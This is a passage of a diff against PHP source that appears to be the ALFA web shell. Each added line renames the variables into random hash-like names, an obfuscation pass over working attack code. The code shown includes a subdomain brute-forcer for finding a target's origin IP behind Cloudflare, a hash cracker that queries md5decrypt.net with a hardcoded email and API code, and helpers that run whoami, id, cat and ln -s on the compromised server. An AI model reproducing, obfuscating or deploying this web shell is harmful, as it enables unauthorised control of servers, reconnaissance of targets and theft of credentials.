 echo "<div class=header><center><br><div class='txtfont_header'>| Cloud Flare ByPasser |</div><br><form action='' onsubmit=\"g('cloudflare',null,this.url.value,'>>'); return false;\" method='post'>
 <p><div class='txtfont'>Target:</div> <input type='text' size=30 name='url' style='text-align:center;' placeholder=\"target.com\"> <input type='submit' name='go' value=' ' /></p></form></center>";
 if($_POST['alfa2'] && $_POST['alfa2'] == '>>'){
-$url = $_POST['alfa1'];
-if(!preg_match('/^(https?):\/\/(w{3}|w3)\./i', $url)){
-$url = preg_replace('/^(https?):\/\//', '', $url);
-$url = "http://www.".$url;
+$fefubzei572d4e421e5e6b9bc11d815e8a027112 = $_POST['alfa1'];
+if(!preg_match('/^(https?):\/\/(w{3}|w3)\./i', $fefubzei572d4e421e5e6b9bc11d815e8a027112)){
+$fefubzei572d4e421e5e6b9bc11d815e8a027112 = preg_replace('/^(https?):\/\//', '', $fefubzei572d4e421e5e6b9bc11d815e8a027112);
+$fefubzei572d4e421e5e6b9bc11d815e8a027112 = "http://www.".$fefubzei572d4e421e5e6b9bc11d815e8a027112;
 }
-$headers = @get_headers($url, 1);
-$server = $headers['Server'];
-$subs = array('owa.','2tty.','m.','gw.','mx1.','store.','1','2','vb.','news.','download.','video','cpanel.', 'ftp.', 'server1.', 'cdn.', 'cdn2.', 'ns.', 'ns3.', 'mail.', 'webmail.', 'direct.', 'direct-connect.', 'record.', 'ssl.', 'dns.', 'help.', 'blog.', 'irc.', 'forum.', 'dl.', 'my.', 'cp.', 'portal.', 'kb.', 'support.','search.', 'docs.', 'files.', 'accounts.', 'secure.', 'register.', 'apps.', 'beta.', 'demo.', 'smtp.', 'ns2.', 'ns1.', 'server.', 'shop.', 'host.', 'web.', 'cloud.', 'api.', 'exchange.', 'app.', 'vps.', 'owa.', 'sat.', 'bbs.', 'movie.', 'music.', 'art.', 'fusion.', 'maps.', 'forums.', 'acc.', 'cc.', 'dev.', 'ww42.', 'wiki.', 'clients.', 'client.','books.','answers.','service.','groups.','images.','upload.','up.','tube.','users.','admin.','administrator.','private.','design.','whmcs.','wp.','wordpress.','joomla.','vbulletin.','test.','developer.','panel.','contact.');
-if(preg_match('/^(https?):\/\/(w{3}|w3)\./i', $url, $matches)){
-if($matches[2] != 'www'){$url = preg_replace('/^(https?):\/\//', '', $url);}else{
-$url = explode($matches[0], $url);
-$url = $url[1];}}
-if(is_array($server))$server = $server[0];
+$afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4 = @get_headers($fefubzei572d4e421e5e6b9bc11d815e8a027112, 1);
+$patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3 = $afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4['Server'];
+$lrvvwdgt960ab0adc680f43e916de7c03ef2e60d = array('owa.','2tty.','m.','gw.','mx1.','store.','1','2','vb.','news.','download.','video','cpanel.', 'ftp.', 'server1.', 'cdn.', 'cdn2.', 'ns.', 'ns3.', 'mail.', 'webmail.', 'direct.', 'direct-connect.', 'record.', 'ssl.', 'dns.', 'help.', 'blog.', 'irc.', 'forum.', 'dl.', 'my.', 'cp.', 'portal.', 'kb.', 'support.','search.', 'docs.', 'files.', 'accounts.', 'secure.', 'register.', 'apps.', 'beta.', 'demo.', 'smtp.', 'ns2.', 'ns1.', 'server.', 'shop.', 'host.', 'web.', 'cloud.', 'api.', 'exchange.', 'app.', 'vps.', 'owa.', 'sat.', 'bbs.', 'movie.', 'music.', 'art.', 'fusion.', 'maps.', 'forums.', 'acc.', 'cc.', 'dev.', 'ww42.', 'wiki.', 'clients.', 'client.','books.','answers.','service.','groups.','images.','upload.','up.','tube.','users.','admin.','administrator.','private.','design.','whmcs.','wp.','wordpress.','joomla.','vbulletin.','test.','developer.','panel.','contact.');
+if(preg_match('/^(https?):\/\/(w{3}|w3)\./i', $fefubzei572d4e421e5e6b9bc11d815e8a027112, $jjpcsdkk9c28d32df234037773be184dbdafc274)){
+if($jjpcsdkk9c28d32df234037773be184dbdafc274[2] != 'www'){$fefubzei572d4e421e5e6b9bc11d815e8a027112 = preg_replace('/^(https?):\/\//', '', $fefubzei572d4e421e5e6b9bc11d815e8a027112);}else{
+$fefubzei572d4e421e5e6b9bc11d815e8a027112 = explode($jjpcsdkk9c28d32df234037773be184dbdafc274[0], $fefubzei572d4e421e5e6b9bc11d815e8a027112);
+$fefubzei572d4e421e5e6b9bc11d815e8a027112 = $fefubzei572d4e421e5e6b9bc11d815e8a027112[1];}}
+if(is_array($patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3))$patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3 = $patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3[0];
 echo __pre();
-if(preg_match('/cloudflare/i', $server))
-echo "\n[+] CloudFlare detected: {$server}\n<br>";
+if(preg_match('/cloudflare/i', $patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3))
+echo "\n[+] CloudFlare detected: {$patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3}\n<br>";
 else
 echo "\n[+] CloudFlare wasn't detected, proceeding anyway.\n";
-echo '[+] CloudFlare IP: ' . is_ipv4(gethostbyname($url)) . "\n\n<br><br>";
+echo '[+] CloudFlare IP: ' . is_ipv4(gethostbyname($fefubzei572d4e421e5e6b9bc11d815e8a027112)) . "\n\n<br><br>";
 echo "[+] Searching for more IP addresses.\n\n<br><br>";
-for($x=0;$x<count($subs);$x++){
-$site = $subs[$x] . $url;
-$ip = is_ipv4(gethostbyname($site));
-if($ip == '(Null)')
+for($fyyftmba9dd4e461268c8034f5c8564e155c67a6=0;$fyyftmba9dd4e461268c8034f5c8564e155c67a6<count($lrvvwdgt960ab0adc680f43e916de7c03ef2e60d);$fyyftmba9dd4e461268c8034f5c8564e155c67a6++){
+$svjurwzc98defd6ee70dfb1dea416cecdf391f58 = $lrvvwdgt960ab0adc680f43e916de7c03ef2e60d[$fyyftmba9dd4e461268c8034f5c8564e155c67a6] . $fefubzei572d4e421e5e6b9bc11d815e8a027112;
+$jywhuplv957b527bcfbad2e80f58d20683931435 = is_ipv4(gethostbyname($svjurwzc98defd6ee70dfb1dea416cecdf391f58));
+if($jywhuplv957b527bcfbad2e80f58d20683931435 == '(Null)')
 continue;
-echo "Trying {$site}: {$ip}\n<br>";
+echo "Trying {$svjurwzc98defd6ee70dfb1dea416cecdf391f58}: {$jywhuplv957b527bcfbad2e80f58d20683931435}\n<br>";
 }
 echo "\n[+] Finished.\n<br>";
 }
 echo '</div>';
 alfafooter();
 }
-function is_ipv4($ip){
-return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ? $ip : '(Null)';
+function is_ipv4($jywhuplv957b527bcfbad2e80f58d20683931435){
+return filter_var($jywhuplv957b527bcfbad2e80f58d20683931435, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ? $jywhuplv957b527bcfbad2e80f58d20683931435 : '(Null)';
 }
-function __alert($s){
-echo '<center>'.__pre().$s.'</center>';
+function __alert($fwekvgvg03c7c0ace395d80182db07ae2c30f034){
+echo '<center>'.__pre().$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'</center>';
 }
-function create_table($data){
+function create_table($sfmsaibm8d777f385d3dfec8815d20f7496026dc){
 echo '<table border="1">';
-foreach ($data as $key => $val){
-$array = array();
-foreach($val as $k => $v){
-$array[$k] = $v;
+foreach ($sfmsaibm8d777f385d3dfec8815d20f7496026dc as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){
+$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5 = array();
+foreach($jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf as $damiszkt8ce4b16b22b58894aa86c421e8759df3 => $hvlrcxnj9e3669d19b675bd57058fd4664205d2a){
+$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5[$damiszkt8ce4b16b22b58894aa86c421e8759df3] = $hvlrcxnj9e3669d19b675bd57058fd4664205d2a;
 }
-echo "<tr><td><div class='tbltxt'>".$array['tdName']."</div></td><td><input type='text' id='".$array['id']."' name='".$array['inputName']."' ".($array['placeholder']?'placeholder':'value')."='".$array['inputValue']."' size='".$array['inputSize']."' ".($array['disabled']?'disabled':'')."></td></tr>";
+echo "<tr><td><div class='tbltxt'>".$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5['tdName']."</div></td><td><input type='text' id='".$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5['id']."' name='".$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5['inputName']."' ".($vmwhayoqf1f713c9e000f5d3f280adbd124df4f5['placeholder']?'placeholder':'value')."='".$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5['inputValue']."' size='".$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5['inputSize']."' ".($vmwhayoqf1f713c9e000f5d3f280adbd124df4f5['disabled']?'disabled':'')."></td></tr>";
 }
 echo '</table>';
 }
@@ -2225,33 +2299,33 @@ function alfacpcrack(){
 alfahead();
 echo '<div class=header><center><p><div class="txtfont_header">| Hash Tools |</div></p><h3><a href=javascript:void(0) onclick="g(\'cpcrack\',null,\'dec\')">| DeCrypter | </a><a href=javascript:void(0) onclick="g(\'cpcrack\',null,\'analyzer\')">| Hash Analyzer | </a></h3></center>';
 if($_POST['alfa1']=='dec'){
-$algorithms = array('md5'=>'MD5','md4'=>'MD4','sha1'=>'SHA1','sha256'=>'SHA256','sha384'=>'SHA384','sha512'=>'SHA512','ntlm'=>'NTLM');
+$yrfeizku66270707424a729c3e557fceb03f45c9 = array('md5'=>'MD5','md4'=>'MD4','sha1'=>'SHA1','sha256'=>'SHA256','sha384'=>'SHA384','sha512'=>'SHA512','ntlm'=>'NTLM');
 echo '<center><div class="txtfont_header">| DeCrypter |</div><br><br>
 <form onsubmit="g(\'cpcrack\',null,\'dec\',this.md5.value,\'>>\',this.alg.value); return false;"><div class="txtfont">Decrypt Method:</div> <select name="alg" style="width:100px;">';
-foreach($algorithms as $key=>$val){echo('<option value="'.$key.'">'.$val.'</option>');}
+foreach($yrfeizku66270707424a729c3e557fceb03f45c9 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){echo('<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'">'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>');}
 echo'</select><input type="text" placeholder="Hash" name="md5" size="60" id="text" /> <input type="submit" value=" " name="go" /></form></center><br>';
 if($_POST['alfa3'] == '>>'){
-$hash = $_POST['alfa2'];
-if(!empty($hash)){
-$hash_type = $_POST['alfa4'];
-$email = "solevisible@gmail.com";
-$code = "7b9fa79f92c3cd96";
-$target = "https://md5decrypt.net/Api/api.php?hash=".$hash."&hash_type=".$hash_type."&email=".$email."&code=".$code;
-$resp = @file_get_contents($target);
-if($resp==''){
-$get = new AlfaCURL();
-$resp = $get->Send($target);
+$horyspio0800fc577294c34e0b28ad2839435945 = $_POST['alfa2'];
+if(!empty($horyspio0800fc577294c34e0b28ad2839435945)){
+$gtwozuvn591131c751044a25b9add921693b419a = $_POST['alfa4'];
+$ahfizhrg0c83f57c786a0b4a39efab23731c7ebc = "solevisible@gmail.com";
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = "7b9fa79f92c3cd96";
+$nyvfphvm42aefbae01d2dfd981f7da7d823d689e = "https://md5decrypt.net/Api/api.php?hash=".$horyspio0800fc577294c34e0b28ad2839435945."&hash_type=".$gtwozuvn591131c751044a25b9add921693b419a."&email=".$ahfizhrg0c83f57c786a0b4a39efab23731c7ebc."&code=".$nndigmblc13367945d5d4c91047b3b50234aa7ab;
+$ldpkhdqbbd86bced84fb3aef951fb07de8c533c7 = @file_get_contents($nyvfphvm42aefbae01d2dfd981f7da7d823d689e);
+if($ldpkhdqbbd86bced84fb3aef951fb07de8c533c7==''){
+$oirhhzwgb5eda0a74558a342cf659187f06f746f = new AlfaCURL();
+$ldpkhdqbbd86bced84fb3aef951fb07de8c533c7 = $oirhhzwgb5eda0a74558a342cf659187f06f746f->Send($nyvfphvm42aefbae01d2dfd981f7da7d823d689e);
 }
 echo __pre().'<center>';
-switch($resp){
+switch($ldpkhdqbbd86bced84fb3aef951fb07de8c533c7){
 	case('CODE ERREUR : 001'):echo "<b><font color='red'>You exceeded the 400 allowed request per day</font></b>";break;
 	case('CODE ERREUR : 003'):echo "<b><font color='red'>Your request includes more than 400 hashes.</font></b>";break;
 	case('CODE ERREUR : 004'):echo "<b><font color='red'>The type of hash you provide in the argument hash_type doesn't seem to be valid</font></b>";break;
 	case('CODE ERREUR : 005'):echo "<b><font color='red'>The hash you provide doesn't seem to match with the type of hash you set.</font></b>";break;
 }
-if(substr($resp,0,4)!='CODE'&&$resp!=''){
-echo "<b>Result: <font color='green'>".$resp."</font></b>";
-}elseif(substr($resp,0,4)!='CODE'){
+if(substr($ldpkhdqbbd86bced84fb3aef951fb07de8c533c7,0,4)!='CODE'&&$ldpkhdqbbd86bced84fb3aef951fb07de8c533c7!=''){
+echo "<b>Result: <font color='green'>".$ldpkhdqbbd86bced84fb3aef951fb07de8c533c7."</font></b>";
+}elseif(substr($ldpkhdqbbd86bced84fb3aef951fb07de8c533c7,0,4)!='CODE'){
 echo "<font color='red'>NoT Found</font><br />";
 }
 echo('</center>');
@@ -2263,13 +2337,13 @@ echo '<center><p><div class="txtfont_header">| Hash Analyzer |</div></p>
 <form onsubmit="g(\'cpcrack\',null,\'analyzer\',this.hash.value,\'>>\');return false;">
 <div class="txtfont">Hash: </div> <input type="text" placeholder="Hash" name="hash" size="60" id="text" /> <input type="submit" value=" " name="go" /></form></center><br>';
 if($_POST['alfa3'] == '>>'){
-$hash = $_POST['alfa2'];
-if(!empty($hash)){
-$curl = new AlfaCURL();
-$resp = $curl->Send("https://md5decrypt.net/en/HashFinder/","post","hash={$hash}&crypt=Search");
+$horyspio0800fc577294c34e0b28ad2839435945 = $_POST['alfa2'];
+if(!empty($horyspio0800fc577294c34e0b28ad2839435945)){
+$qqhrnrcwf6e57c9de709e45feb0d955351f53548 = new AlfaCURL();
+$ldpkhdqbbd86bced84fb3aef951fb07de8c533c7 = $qqhrnrcwf6e57c9de709e45feb0d955351f53548->Send("https://md5decrypt.net/en/HashFinder/","post","hash={$horyspio0800fc577294c34e0b28ad2839435945}&crypt=Search");
 echo(__pre().'<center>');
-if(preg_match('#<fieldset class="trouve">(.*?)</fieldset>#',$resp,$s)){
-	echo('<font color="green">'.$s[1].'</font>');
+if(preg_match('#<fieldset class="trouve">(.*?)</fieldset>#',$ldpkhdqbbd86bced84fb3aef951fb07de8c533c7,$fwekvgvg03c7c0ace395d80182db07ae2c30f034)){
+	echo('<font color="green">'.$fwekvgvg03c7c0ace395d80182db07ae2c30f034[1].'</font>');
 }else{
 	echo('<font color="red">Not Found...!</font>');
 }
@@ -2394,122 +2468,121 @@ function alfaMysqlApi(e,t){var a={host:mysql_cache[e.db_id].host,user:mysql_cach
 </script>
 </body>
 </html>
-<?php
-}}
+<?php }}
 if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) {
-function posix_getpwuid($p) {return false;} }
+function posix_getpwuid($fxuvmwpb83878c91171338902e0fe0fb97a8c47a) {return false;} }
 if (!function_exists("posix_getgrgid") && (strpos(@ini_get('disable_functions'), 'posix_getgrgid')===false)) {
-function posix_getgrgid($p) {return false;} }
-function alfaWhich($p) {
-$path = alfaEx('which ' . $p,false,false);
-if(!empty($path))
-return strlen($path);
+function posix_getgrgid($fxuvmwpb83878c91171338902e0fe0fb97a8c47a) {return false;} }
+function alfaWhich($fxuvmwpb83878c91171338902e0fe0fb97a8c47a) {
+$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = alfaEx('which ' . $fxuvmwpb83878c91171338902e0fe0fb97a8c47a,false,false);
+if(!empty($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485))
+return strlen($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
 return false;
 }
-function alfaSize($s) {
-if($s >= 1073741824)
-return sprintf('%1.2f', $s / 1073741824 ). ' GB';
-elseif($s >= 1048576)
-return sprintf('%1.2f', $s / 1048576 ) . ' MB';
-elseif($s >= 1024)
-return sprintf('%1.2f', $s / 1024 ) . ' KB';
+function alfaSize($fwekvgvg03c7c0ace395d80182db07ae2c30f034) {
+if($fwekvgvg03c7c0ace395d80182db07ae2c30f034 >= 1073741824)
+return sprintf('%1.2f', $fwekvgvg03c7c0ace395d80182db07ae2c30f034 / 1073741824 ). ' GB';
+elseif($fwekvgvg03c7c0ace395d80182db07ae2c30f034 >= 1048576)
+return sprintf('%1.2f', $fwekvgvg03c7c0ace395d80182db07ae2c30f034 / 1048576 ) . ' MB';
+elseif($fwekvgvg03c7c0ace395d80182db07ae2c30f034 >= 1024)
+return sprintf('%1.2f', $fwekvgvg03c7c0ace395d80182db07ae2c30f034 / 1024 ) . ' KB';
 else
-return $s . ' B';
+return $fwekvgvg03c7c0ace395d80182db07ae2c30f034 . ' B';
 }
-function alfaPerms($p) {
-if (($p & 0xC000) == 0xC000)$i = 's​';
-elseif (($p & 0xA000) == 0xA000)$i = 'l​';
-elseif (($p & 0x8000) == 0x8000)$i = '-​';
-elseif (($p & 0x6000) == 0x6000)$i = 'b​';
-elseif (($p & 0x4000) == 0x4000)$i = 'd​';
-elseif (($p & 0x2000) == 0x2000)$i = 'c​';
-elseif (($p & 0x1000) == 0x1000)$i = 'p​';
-else $i = 'u​';
-$i .= (($p & 0x0100) ? 'r​' : '-');
-$i .= (($p & 0x0080) ? 'w​' : '-');
-$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's​' : 'x​' ) : (($p & 0x0800) ? 'S​' : '-'));
-$i .= (($p & 0x0020) ? 'r​' : '-');
-$i .= (($p & 0x0010) ? 'w​' : '-');
-$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's​' : 'x​' ) : (($p & 0x0400) ? 'S​' : '-'));
-$i .= (($p & 0x0004) ? 'r​' : '-');
-$i .= (($p & 0x0002) ? 'w​' : '-');
-$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't​' : 'x​' ) : (($p & 0x0200) ? 'T​' : '-'));
-return $i;
+function alfaPerms($fxuvmwpb83878c91171338902e0fe0fb97a8c47a) {
+if (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0xC000) == 0xC000)$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 's​';
+elseif (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0xA000) == 0xA000)$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 'l​';
+elseif (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x8000) == 0x8000)$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = '-​';
+elseif (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x6000) == 0x6000)$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 'b​';
+elseif (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x4000) == 0x4000)$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 'd​';
+elseif (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x2000) == 0x2000)$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 'c​';
+elseif (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x1000) == 0x1000)$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 'p​';
+else $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 'u​';
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0100) ? 'r​' : '-');
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0080) ? 'w​' : '-');
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0040) ? (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0800) ? 's​' : 'x​' ) : (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0800) ? 'S​' : '-'));
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0020) ? 'r​' : '-');
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0010) ? 'w​' : '-');
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0008) ? (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0400) ? 's​' : 'x​' ) : (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0400) ? 'S​' : '-'));
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0004) ? 'r​' : '-');
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0002) ? 'w​' : '-');
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0001) ? (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0200) ? 't​' : 'x​' ) : (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0200) ? 'T​' : '-'));
+return $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741;
 }
-function alfaPermsColor($f,$isbash=false){
-$class = "";
-$num = "";
-$human = "";
-if($isbash){
-$class = $f["class"];
-$num = $f["num"];
-$human = $f["human"];
+function alfaPermsColor($npviloqa8fa14cdd754f91cc6554c9e71929cce7,$oonpoqrw6f9a1cfe95f618ee5aa1c727f01ed6f4=false){
+$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d = "";
+$mzomhdvt0fc3cfbc27e91ea60a787de13dae3e3c = "";
+$kublywwm99e9bae675b12967251c175696f00a70 = "";
+if($oonpoqrw6f9a1cfe95f618ee5aa1c727f01ed6f4){
+$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d = $npviloqa8fa14cdd754f91cc6554c9e71929cce7["class"];
+$mzomhdvt0fc3cfbc27e91ea60a787de13dae3e3c = $npviloqa8fa14cdd754f91cc6554c9e71929cce7["num"];
+$kublywwm99e9bae675b12967251c175696f00a70 = $npviloqa8fa14cdd754f91cc6554c9e71929cce7["human"];
 }else{
-$num = substr(sprintf('%o', @fileperms($f)),-4);
-$human = alfaPerms(@fileperms($f));
-if(!@is_readable($f))
-$class = "main_red_perm";
-elseif (!@is_writable($f))
-$class = "main_white_perm";
+$mzomhdvt0fc3cfbc27e91ea60a787de13dae3e3c = substr(sprintf('%o', @fileperms($npviloqa8fa14cdd754f91cc6554c9e71929cce7)),-4);
+$kublywwm99e9bae675b12967251c175696f00a70 = alfaPerms(@fileperms($npviloqa8fa14cdd754f91cc6554c9e71929cce7));
+if(!@is_readable($npviloqa8fa14cdd754f91cc6554c9e71929cce7))
+$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d = "main_red_perm";
+elseif (!@is_writable($npviloqa8fa14cdd754f91cc6554c9e71929cce7))
+$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d = "main_white_perm";
 else
-$class = "main_green_perm";
+$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d = "main_green_perm";
 }
-return '<span style="font-weight:unset;" class="'.$class.'">'.$num.'</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="'.$class.'">'.$human.'</span>';
+return '<span style="font-weight:unset;" class="'.$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d.'">'.$mzomhdvt0fc3cfbc27e91ea60a787de13dae3e3c.'</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="'.$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d.'">'.$kublywwm99e9bae675b12967251c175696f00a70.'</span>';
 }
 if(!function_exists("scandir")) {
-function scandir($dir) {
-$dh = opendir($dir);
-while (false !== ($filename = readdir($dh)))
-$files[] = $filename;
-return $files;
+function scandir($ofvepnxk736007832d2167baaae763fd3a3f3cf1) {
+$qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc = opendir($ofvepnxk736007832d2167baaae763fd3a3f3cf1);
+while (false !== ($ydojshxa435ed7e9f07f740abf511a62c00eef6e = readdir($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc)))
+$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1[] = $ydojshxa435ed7e9f07f740abf511a62c00eef6e;
+return $blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1;
 }
 }
-function reArrayFiles($file_post){
-$file_ary = array();
-$file_count = count($file_post['name']);
-$file_keys = array_keys($file_post);
-for ($i=0; $i<$file_count; $i++) {
-foreach ($file_keys as $key) {
-$file_ary[$i][$key] = $file_post[$key][$i];
+function reArrayFiles($zxmbbootfcd7c3d68f3a011af28550aad9ca44a4){
+$qfsqfqhdd303f5630eca273e4e8b7b7a5a602f50 = array();
+$ikrgolej287f62860660cd88bef7f55c281fa53b = count($zxmbbootfcd7c3d68f3a011af28550aad9ca44a4['name']);
+$rggtkmrg5b25659ed7bed024f2cd7a1f57e6f2ac = array_keys($zxmbbootfcd7c3d68f3a011af28550aad9ca44a4);
+for ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<$ikrgolej287f62860660cd88bef7f55c281fa53b; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++) {
+foreach ($rggtkmrg5b25659ed7bed024f2cd7a1f57e6f2ac as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d) {
+$qfsqfqhdd303f5630eca273e4e8b7b7a5a602f50[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741][$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d] = $zxmbbootfcd7c3d68f3a011af28550aad9ca44a4[$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d][$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741];
 }
 }
-return $file_ary;
+return $qfsqfqhdd303f5630eca273e4e8b7b7a5a602f50;
 }
-function _alfa_can_runCommand($cgi=true,$cache=true){
-	if(isset($_COOKIE["alfa_canruncmd"])&&$cache){
+function _alfa_can_runCommand($aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda=true,$fngvuqqo0fea6a13c52b4d4725368f24b045ca84=true){
+	if(isset($_COOKIE["alfa_canruncmd"])&&$fngvuqqo0fea6a13c52b4d4725368f24b045ca84){
 		return true;
 	}
-	if(strlen(alfaEx("whoami",false,$cgi))>0){
+	if(strlen(alfaEx("whoami",false,$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda))>0){
 		$_COOKIE["alfa_canruncmd"] = true;
 		return true;
 	}
 	return false;
 }
-function _alfa_symlink($target, $link){
-	$phpsym = function_exists("symlink");
-	if($phpsym){
-		@symlink($target, $link);
+function _alfa_symlink($nyvfphvm42aefbae01d2dfd981f7da7d823d689e, $rsrmsacs2a304a1348456ccd2234cd71a81bd338){
+	$ezlfsluv8cbe5a9cdb39b55ad0bfb5f7ca5ecc2d = function_exists("symlink");
+	if($ezlfsluv8cbe5a9cdb39b55ad0bfb5f7ca5ecc2d){
+		@symlink($nyvfphvm42aefbae01d2dfd981f7da7d823d689e, $rsrmsacs2a304a1348456ccd2234cd71a81bd338);
 	}else{
-		alfaEx("ln -s '".addslashes($target)."' '".addslashes($link)."'");
+		alfaEx("ln -s '".addslashes($nyvfphvm42aefbae01d2dfd981f7da7d823d689e)."' '".addslashes($rsrmsacs2a304a1348456ccd2234cd71a81bd338)."'");
 	}
 }
-function _alfa_file_exists($file,$cgi=true){
-	if(@file_exists($file)){
+function _alfa_file_exists($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda=true){
+	if(@file_exists($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)){
 		return true;
 	}else{
-		if(strlen(alfaEx("ls -la '".addslashes($file)."'",false,$cgi))>0){
+		if(strlen(alfaEx("ls -la '".addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)."'",false,$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda))>0){
 			return true;
 		}
 	}
 	return false;
 }
-function _alfa_file($file,$cgi=true){
-	$array = @file($file);
-	if(!$array){
-		if(strlen(alfaEx("id",false,$cgi))>0){
-			$data = alfaEx('cat "'.addslashes($file).'"',false,$cgi);
-			if(strlen($data)>0){
-				return explode("\n", $data);
+function _alfa_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda=true){
+	$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5 = @file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
+	if(!$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5){
+		if(strlen(alfaEx("id",false,$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda))>0){
+			$sfmsaibm8d777f385d3dfec8815d20f7496026dc = alfaEx('cat "'.addslashes($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac).'"',false,$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda);
